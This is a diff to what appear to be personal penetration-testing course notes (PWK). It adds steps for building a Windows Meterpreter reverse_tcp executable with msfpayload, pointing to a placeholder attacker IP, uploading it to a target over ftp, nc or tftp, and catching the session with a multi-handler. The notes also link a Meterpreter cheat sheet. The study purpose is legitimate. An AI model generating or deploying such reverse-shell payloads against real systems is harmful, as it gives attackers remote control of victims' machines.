@@ -4,3 +4,16 @@ set rhosts file:/home/dan/PWK/scripts/recon_scan/ftp.txt
 # cheat sheet
 
 https://scadahacker.com/library/Documents/Cheat_Sheets/Hacking%20-%20Meterpreter%20Cheat%20%20Sheet.pdf
+
+## to create payload for execution on host and establish meterpreter sessions
+# 1 Create window payload
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.xx.xx LPORT=4444 X > /home/dan/PWK/upload_tools/win_meterpreter_shell.exe
+
+# 2 upload .exe to host using ftp/nc/tftp etc
+
+# 3 Establish multi-handler listener by lauching .exe
+
+
+
+
